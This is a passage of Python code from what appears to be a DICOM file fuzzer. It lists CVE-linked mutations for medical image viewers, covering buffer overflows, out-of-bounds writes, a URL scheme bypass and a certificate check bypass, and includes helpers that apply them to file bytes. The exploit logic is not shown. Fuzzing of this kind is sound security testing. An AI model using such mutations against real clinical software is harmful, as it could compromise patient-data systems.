        severity="high",
        target_component="pixel_data",
    ),
    # CVE-2024-25578: MicroDicom Out-of-Bounds Write
    CVEMutation(
        cve_id="CVE-2024-25578",
        category=CVECategory.OUT_OF_BOUNDS_WRITE,
        description="MicroDicom OOB write due to lack of validation",
        mutation_func="mutate_oob_write_lack_validation",
        severity="high",
        target_component="vr_length",
    ),
    # CVE-2024-22100: MicroDicom Heap-Based Buffer Overflow
    CVEMutation(
        cve_id="CVE-2024-22100",
        category=CVECategory.HEAP_OVERFLOW,
        description="MicroDicom heap overflow in DCM parsing",
        mutation_func="mutate_heap_overflow_dcm_parsing",
        severity="high",
        target_component="private_elements",
    ),
    # CVE-2024-28877: MicroDicom Stack-Based Buffer Overflow
    CVEMutation(
        cve_id="CVE-2024-28877",
        category=CVECategory.STACK_OVERFLOW,
        description="MicroDicom stack overflow via nested sequences",
        mutation_func="mutate_stack_overflow_dcm",
        severity="high",
        target_component="sequence",
    ),
    # CVE-2024-33606: MicroDicom URL Scheme Bypass
    CVEMutation(
        cve_id="CVE-2024-33606",
        category=CVECategory.URL_SCHEME_BYPASS,
        description="MicroDicom URL scheme bypass for arbitrary file access",
        mutation_func="mutate_url_scheme_bypass",
        severity="high",
        target_component="retrieve_url",
    ),
    # CVE-2025-1001: RadiAnt DICOM Viewer Certificate Validation Bypass
    CVEMutation(
        cve_id="CVE-2025-1001",
        category=CVECategory.CERTIFICATE_VALIDATION,
        description="RadiAnt certificate validation bypass enabling MITM",
        mutation_func="mutate_certificate_validation_bypass",
        severity="medium",
        target_component="metadata",
    ),
]


def get_mutation_func(name: str) -> Any:
    """Get mutation function by name."""
    return globals().get(name)


def apply_cve_mutation(
    data: bytes, cve_id: str | None = None
) -> tuple[bytes, CVEMutation]:
    """Apply a CVE-inspired mutation to DICOM data.

    Args:
        data: Original DICOM bytes
        cve_id: Optional specific CVE to target

    Returns:
        Tuple of (mutated_data, mutation_info)

    """
    if cve_id:
        mutations = [m for m in CVE_MUTATIONS if m.cve_id == cve_id]
        if not mutations:
            raise ValueError(f"Unknown CVE: {cve_id}")
    else:
        mutations = CVE_MUTATIONS

    mutation = random.choice(mutations)
    func = get_mutation_func(mutation.mutation_func)

    if func is None:
        raise ValueError(f"Mutation function not found: {mutation.mutation_func}")

    mutated_data = func(data)
    return mutated_data, mutation


def get_available_cves() -> list[str]:
    """Get list of available CVE IDs."""
    return list({m.cve_id for m in CVE_MUTATIONS})


def get_mutations_by_category(category: CVECategory) -> list[CVEMutation]:
    """Get mutations by category."""
    return [m for m in CVE_MUTATIONS if m.category == category]
